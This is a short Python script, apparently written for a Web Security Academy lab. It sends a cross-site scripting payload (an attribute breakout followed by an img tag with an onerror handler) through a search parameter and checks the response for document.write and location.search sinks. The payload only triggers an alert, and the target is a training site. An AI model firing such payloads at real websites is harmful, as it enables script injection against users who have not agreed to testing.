import requests

url = "https://0a73002b04f8887380011cde00490016.web-security-academy.net/"
pre_payload = '">'
payload = "<img src=c onerror=alert()>"
full_payload = f"{pre_payload}{payload}"
response = requests.get(url + "?search=" + full_payload)
print(response.status_code)
index = response.text.find("img src=c onerror=alert()")
print(response.text[index - 50 : index + 100])
if "document.write" in response.text:
    print("yes")
if "location.search" in response.text:
    print("shit")
